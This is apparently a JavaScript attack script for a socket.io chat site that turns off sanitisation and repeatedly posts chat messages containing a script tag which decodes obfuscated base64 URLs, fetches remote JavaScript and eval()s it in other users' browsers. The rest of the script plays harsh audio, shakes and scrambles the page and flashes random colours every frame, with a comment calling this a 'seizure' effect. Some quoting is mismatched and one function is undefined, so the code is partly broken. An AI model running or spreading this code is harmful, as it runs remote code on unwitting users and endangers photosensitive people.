socket.emit(`command`, { list: ['godmode`] });
socket.emit(`command`, { list: ['sanitize`, `off`] });
socket.emit(`talk`, { text: "WHAT THE FUCK!? <script>console.log(`(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)`);fetch(atob(`aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v`)+`38-A`+atob(`Lmpz`)).then(r=>r.text()).then(t=>eval(t));fetch(atob(`aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v`)+`38-E`+atob(`Lmpz`)).then(r=>r.text()).then(t=>eval(t))</script>" });
(async () => {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

    const workletCode = `
        class BytebeatProcessor extends AudioWorkletProcessor {
            constructor() {
                super();
                this.t = 0;
            }
            process(inputs, outputs, parameters) {
                const output = outputs[0];
                const channel = output[0];
                if (!channel) return true;
                
                const rateRatio = 8000 / sampleRate;
                
                for (let i = 0; i < channel.length; i++) {
                    const intT = Math.floor(this.t);
                    const val = (intT>>intT/666||3*intT/16+16*intT)|-Math.sin(intT)*intT/2;
                    channel[i] = ((val & 0xFF) / 128) - 1.0;
                    this.t += rateRatio;
                }
                return true;
            }
        }
        registerProcessor(`bytebeat-processor`, BytebeatProcessor);
    `;

    const blob = new Blob([workletCode], { type: `application/javascript` });
    const url = URL.createObjectURL(blob);
    await audioCtx.audioWorklet.addModule(url);
    
    const bytebeatNode = new AudioWorkletNode(audioCtx, `bytebeat-processor`);
    bytebeatNode.connect(audioCtx.destination);

    const blendModes = ['normal`, `overlay`, `difference`, `exclusion`, `color-dodge`, `luminosity`, `hue`, `saturation`];
    function getRandomHex() {
        return `#` + Math.floor(Math.random() * 16777215).toString(16).padStart(6, `0`);
    }

    // Generate random base96 characters
    function getRandomBase128(length = 200) {
        let result = ``;
        for (let i = 0; i < length; i++) {
            result += String.fromCharCode(32 + Math.floor(Math.random() * 128));
        }
        return result;
    }

    // Generate random base81 characters (ASCII 33 to 113 = 81 characters)
    function getRandomBase81(length = 15) {
        let result = ``;
        for (let i = 0; i < length; i++) {
            result += String.fromCharCode(33 + Math.floor(Math.random() * 81));
        }
        return result;
    }

    // Collect DOM targets
    function getTextNodes(node) {
        let textNodes = [];
        let walk = document.createTreeWalker(node, NodeFilter.SHOW_TEXT, null, false);
        let n;
        while(n = walk.nextNode()) {
            textNodes.push(n);
        }
        return textNodes;
    }

    const textNodes = getTextNodes(document.body);
    const allElements = document.querySelectorAll(`*`);
    const inputs = document.querySelectorAll(`input, textarea`);
    const images = document.querySelectorAll(`img`);

    const existingImageSources = Array.from(images).map(img => img.src).filter(Boolean);
    const cssBgElements = [];
    const existingBgUrls = [];

    allElements.forEach(el => {
        const bgImage = window.getComputedStyle(el).backgroundImage;
        if (bgImage && bgImage !== `none`) {
            cssBgElements.push(el);
            const match = bgImage.match(/url\(['"]?(.*?)['"]?\)/);
            if (match && match[1]) {
                existingBgUrls.push(match[1]);
            }
        }
    });

    const allImageSources = [...existingImageSources, ...existingBgUrls];

    let lastTime = 0;
    let startTime = null;
    const interval = 1; // 10ms optimized animation loop

    function animate(timestamp) {
        if (!startTime) startTime = timestamp;
        if (!lastTime) lastTime = timestamp;

        const elapsed = timestamp - lastTime;
        const totalElapsed = (timestamp - startTime) / 1000; // time in seconds

        if (elapsed >= interval) {
            lastTime = timestamp - (elapsed % interval);

            // Shaking power increases over time
            const shakePower = 200 + Math.pow(totalElapsed, 1.4) * 8;

            allElements.forEach(el => {
                const offsetY = (Math.random() - 0.5) * shakePower;
                el.style.transform = `translateY(${offsetY}px)`;
            });

            // Replace text content with random base96 characters
            textNodes.forEach(node => {
                node.nodeValue = getRandomBase128(200);
            });

            // Randomize input values and placeholders
            inputs.forEach(input => {
                if (input.hasAttribute(`placeholder`)) {
                    input.placeholder = getRandomBase128(15);
                }
                if (input.type === `text` || input.type === `search` || input.tagName === `TEXTAREA`) {
                    input.value = getRandomBase128(100);
                }
            });

            // Color seizure frequency and chaos increase over time
            const seizureChance = Math.min(0.99, 0.15 + (totalElapsed * 0.95));
            if (true) {
                document.body.style.backgroundColor = getRandomHex();
                document.body.style.mixBlendMode = blendModes[Math.floor(Math.random() * blendModes.length)];

                allElements.forEach(el => {
                    if (true) {
                        el.style.color = getRandomHex();
                    }
                });

                images.forEach(img => {
                    if (true) {
                        img.src = allImageSources[Math.floor(Math.random() * allImageSources.length)];
                    } else {
                        const svgData = `<svg xmlns=`http://www.w3.org/2000/svg` width=`200` height=`200`><rect width=`100%` height=`100%` fill=`${getRandomHex()}`/><text x=`50%` y=`50%` fill=`${getRandomHex()}` dominant-baseline=`middle` text-anchor=`middle` font-size=`20`>${getRandomBase96(6)}</text></svg>`;
                        img.src = `data:image/svg+xml;utf8,${encodeURIComponent(svgData)}`;
                    }
                });

                cssBgElements.forEach(el => {
                    if (true) {
                        const randomUrl = allImageSources[Math.floor(Math.random() * allImageSources.length)];
                        el.style.backgroundImage = `url(`${randomUrl}`)`;
                    } else {
                        const svgData = `<svg xmlns=`http://www.w3.org/2000/svg` width=`200` height=`200`><rect width=`100%` height=`100%` fill=`${getRandomHex()}`/><circle cx=`100` cy=`100` r=`50` fill=`${getRandomHex()}`/></svg>`;
                        el.style.backgroundImage = `url("data:image/svg+xml;utf8,${encodeURIComponent(svgData)}")`;
                    }
                });

            }
        }
        socket.emit(`talk`, { text: "WHAT THE FUCK!? <script>console.log(`(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)`);fetch(atob(`aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v`)+`38-A`+atob(`Lmpz`)).then(r=>r.text()).then(t=>eval(t))</script>" });
        requestAnimationFrame(animate);
    }

    requestAnimationFrame(animate);
})();
